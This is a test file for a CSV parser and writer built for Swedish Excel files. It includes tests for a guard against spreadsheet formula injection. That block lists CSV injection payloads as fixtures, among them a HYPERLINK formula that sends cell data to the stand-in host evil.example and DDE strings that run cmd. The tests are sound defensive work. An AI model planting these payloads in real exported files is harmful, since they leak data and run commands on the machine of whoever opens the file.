import { CSV_BOM, guardFormula, parseCsv, unguardFormula, writeCsv } from './csv';

describe('parseCsv', () => {
  it('reads a ;-separated file with a BOM and CRLF, the way Swedish Excel writes it', () => {
    const parsed = parseCsv(`${CSV_BOM}Namn;Ort\r\nÅsa;Örebro\r\nBo;Lund\r\n`);
    expect(parsed).toEqual({
      rows: [
        ['Namn', 'Ort'],
        ['Åsa', 'Örebro'],
        ['Bo', 'Lund'],
      ],
      delimiter: ';',
      unterminated: false,
      rowNumbers: [1, 2, 3],
    });
  });

  it('detects ; , and tab from the file, and settles a tie for ;', () => {
    expect(parseCsv('a,b,c\n1,2,3').delimiter).toBe(',');
    expect(parseCsv('a\tb\tc\n1\t2\t3').delimiter).toBe('\t');
    expect(parseCsv('a;b;c\n1;2;3').delimiter).toBe(';');
    expect(parseCsv('a;b,c').delimiter).toBe(';');
    // No delimiter at all: a one-column file is ';', the Swedish default.
    expect(parseCsv('a\nb').delimiter).toBe(';');
    expect(parseCsv('').delimiter).toBe(';');
  });

  it('does not let a delimiter inside quotes count towards the guess', () => {
    const parsed = parseCsv('"a,b,c,d";e\n"f,g,h";i');
    expect(parsed.delimiter).toBe(';');
    expect(parsed.rows).toEqual([
      ['a,b,c,d', 'e'],
      ['f,g,h', 'i'],
    ]);
  });

  it('is not tipped by a title line with a comma above a ;-separated table', () => {
    const text = 'Schema för Lillskolan, hösten 2026\nKlass;Ämne;Dag;Start;Slut\n1A;Matematik;Mån;08:30;09:15\n';
    const parsed = parseCsv(text);
    expect(parsed.delimiter).toBe(';');
    expect(parsed.rows[1]).toEqual(['Klass', 'Ämne', 'Dag', 'Start', 'Slut']);
  });

  it('chooses the delimiter from the first ten records only', () => {
    const head = Array.from({ length: 10 }, () => 'a;b').join('\n');
    const tail = Array.from({ length: 50 }, () => 'x,y,z,w,v,u').join('\n');
    expect(parseCsv(`${head}\n${tail}`).delimiter).toBe(';');
  });

  it('accepts CRLF, LF and a lone CR as line breaks and a missing final newline', () => {
    for (const eol of ['\r\n', '\n', '\r']) {
      expect(parseCsv(`a;b${eol}c;d`).rows).toEqual([
        ['a', 'b'],
        ['c', 'd'],
      ]);
      expect(parseCsv(`a;b${eol}c;d${eol}`).rows).toEqual([
        ['a', 'b'],
        ['c', 'd'],
      ]);
    }
  });

  it('reads quoted fields: embedded delimiters, doubled quotes and line breaks of every kind', () => {
    const parsed = parseCsv('"Idrott; hälsa";"säger ""hej""";"rad ett\r\nrad två\nrad tre\rrad fyra"\r\nb;c;d');
    expect(parsed.rows).toEqual([
      ['Idrott; hälsa', 'säger "hej"', 'rad ett\r\nrad två\nrad tre\rrad fyra'],
      ['b', 'c', 'd'],
    ]);
    expect(parsed.unterminated).toBe(false);
  });

  it('opens a quote only at the start of a field, and keeps what follows a closing quote', () => {
    expect(parseCsv('5" rör;b').rows).toEqual([['5" rör', 'b']]);
    expect(parseCsv('"ab"c;d').rows).toEqual([['abc', 'd']]);
    // A quoted empty field is empty, and a quote after it is a plain character.
    expect(parseCsv('"";"x"y"z";a').rows).toEqual([['', 'xy"z"', 'a']]);
  });

  it('keeps empty cells, including a trailing one and an empty quoted one', () => {
    expect(parseCsv('a;;c;').rows).toEqual([['a', '', 'c', '']]);
    expect(parseCsv('a;""').rows).toEqual([['a', '']]);
    expect(parseCsv(';').rows).toEqual([]);
  });

  it('drops fully empty rows but numbers the rest as Excel does', () => {
    const parsed = parseCsv('a;b\n\n;\n  ; \nc;d\n\ne;f');
    expect(parsed.rows).toEqual([
      ['a', 'b'],
      ['c', 'd'],
      ['e', 'f'],
    ]);
    // Records 3 and 4 hold only delimiters or blanks; record 6 is blank.
    expect(parsed.rowNumbers).toEqual([1, 5, 7]);
  });

  it('counts a quoted multi-line cell as one record', () => {
    const parsed = parseCsv('a;"x\ny"\nb;c');
    expect(parsed.rows).toEqual([
      ['a', 'x\ny'],
      ['b', 'c'],
    ]);
    expect(parsed.rowNumbers).toEqual([1, 2]);
  });

  it('keeps cells as written: no trimming', () => {
    expect(parseCsv(' a ; b ').rows).toEqual([[' a ', ' b ']]);
  });

  it('reports a quote that never closes and ends the field at the end of input', () => {
    const parsed = parseCsv('a;b\nc;"d;e\nf;g');
    expect(parsed.unterminated).toBe(true);
    expect(parsed.rows).toEqual([
      ['a', 'b'],
      ['c', 'd;e\nf;g'],
    ]);
    // A lone quote at the very end: still no throw, still reported.
    expect(parseCsv('a;"')).toMatchObject({ unterminated: true, rows: [['a', '']] });
    expect(parseCsv('"')).toMatchObject({ unterminated: true, rows: [] });
  });

  it('strips one leading BOM and nothing else', () => {
    expect(parseCsv(`${CSV_BOM}a`).rows).toEqual([['a']]);
    expect(parseCsv(`${CSV_BOM}${CSV_BOM}a`).rows[0]![0]).toBe(`${CSV_BOM}a`);
  });

  it('never throws, whatever the text', () => {
    // A small deterministic generator over the characters that matter.
    const alphabet = ['"', ';', ',', '\t', '\n', '\r', "'", '=', 'a', ' ', CSV_BOM, '-'];
    let seed = 12345;
    const next = (): number => {
      seed = (seed * 1103515245 + 12345) & 0x7fffffff;
      return seed;
    };
    for (let i = 0; i < 2000; i += 1) {
      let text = '';
      for (let n = next() % 40; n > 0; n -= 1) text += alphabet[next() % alphabet.length];
      const parsed = parseCsv(text);
      expect(Array.isArray(parsed.rows)).toBe(true);
      expect(parsed.rowNumbers).toHaveLength(parsed.rows.length);
    }
  });
});

describe('writeCsv', () => {
  it('writes ; with a BOM and CRLF after every line, quoting only where needed', () => {
    const text = writeCsv([
      ['Namn', 'Ort'],
      ['Åsa', 'Örebro'],
    ]);
    expect(text).toBe(`${CSV_BOM}Namn;Ort\r\nÅsa;Örebro\r\n`);
  });

  it('writes with a comma when asked', () => {
    expect(writeCsv([['a', 'b']], { delimiter: ',' })).toBe(`${CSV_BOM}a,b\r\n`);
  });

  it('quotes a cell that holds a quote, a line break or any delimiter the reader can detect', () => {
    expect(writeCsv([['a;b', 'c,d', 'e\tf', 'g"h', 'i\nj', 'k\rl', 'plain']])).toBe(
      `${CSV_BOM}"a;b";"c,d";"e\tf";"g""h";"i\nj";"k\rl";plain\r\n`,
    );
  });

  it('writes nothing but the BOM for no rows, and does not pad a short row', () => {
    expect(writeCsv([])).toBe(CSV_BOM);
    expect(writeCsv([['a', 'b'], ['c']])).toBe(`${CSV_BOM}a;b\r\nc\r\n`);
  });
});

describe('the formula guard', () => {
  const attacks = [
    '=HYPERLINK("http://evil.example/"&A1,"klicka")',
    '+1+1',
    "-2+3+cmd|' /C calc'!A0",
    "@SUM(1+1)*cmd|' /C calc'!A0",
    '\t=1+1',
    '   =1+1',
    '\r=1+1',
    '=1+1',
  ];

  it.each(attacks)('protects %j with an apostrophe in front, quoted or not', (payload) => {
    const written = writeCsv([['name', payload]]);
    const cell = written.slice(CSV_BOM.length).replace(/\r\n$/, '').slice('name;'.length);
    expect(cell.replace(/^"/, '').startsWith("'")).toBe(true);
    expect(parseCsv(written).rows).toEqual([['name', payload]]);
  });

  it('leaves plain numbers alone, as the web does, so a figure that sums stays a figure', () => {
    for (const number of ['-5', '+5', '-12,5', '-0.5', '\t-5']) {
      expect(guardFormula(number)).toBe(number);
    }
    // ... and still guards what only starts like a number.
    expect(guardFormula('-12,5+A1')).toBe("'-12,5+A1");
    expect(guardFormula('-1,2,3')).toBe("'-1,2,3");
    expect(guardFormula('-')).toBe("'-");
    expect(guardFormula('+1+1')).toBe("'+1+1");
  });

  it('leaves ordinary values untouched: times, dates, names, an apostrophe that is just an apostrophe', () => {
    for (const value of ['08:10', '2026-08-17', 'Öberg', '', ' x', "'Anna'", "O'Brien", '1E3', '007', "'"]) {
      expect(guardFormula(value)).toBe(value);
      expect(unguardFormula(value)).toBe(value);
    }
  });

  it('doubles the apostrophe of a value that already looks guarded, so it comes back with it', () => {
    expect(guardFormula("'=x")).toBe("''=x");
    expect(unguardFormula("''=x")).toBe("'=x");
    expect(guardFormula("'-5")).toBe("''-5"); // not a plain number: it has an apostrophe
    expect(unguardFormula(guardFormula("'-5"))).toBe("'-5");
    expect(unguardFormula("'=x")).toBe('=x');
  });

  it('round-trips EVERY value over an alphabet of the characters that matter, up to four long', () => {
    const alphabet = ["'", '=', '-', '+', '@', ' ', '"', ';', ',', '\t', '\n', '\r', 'a', '1'];
    const values: string[] = [''];
    let layer: string[] = [''];
    for (let length = 1; length <= 4; length += 1) {
      layer = layer.flatMap((prefix) => alphabet.map((char) => prefix + char));
      values.push(...layer);
    }
    for (const delimiter of [';', ','] as const) {
      // 'x' beside it so that a blank-looking value does not make the row blank.
      const rows = values.map((value) => ['x', value]);
      const parsed = parseCsv(writeCsv(rows, { delimiter }));
      expect(parsed.delimiter).toBe(delimiter);
      expect(parsed.rows).toEqual(rows);
    }
    expect(values.length).toBeGreaterThan(40000);
  });

  it('round-trips a one-column file whose cells hold delimiters', () => {
    const rows = [['a,b'], ['c;d'], ['e\tf']];
    expect(parseCsv(writeCsv(rows)).rows).toEqual(rows);
    expect(parseCsv(writeCsv(rows, { delimiter: ',' })).rows).toEqual(rows);
  });
});
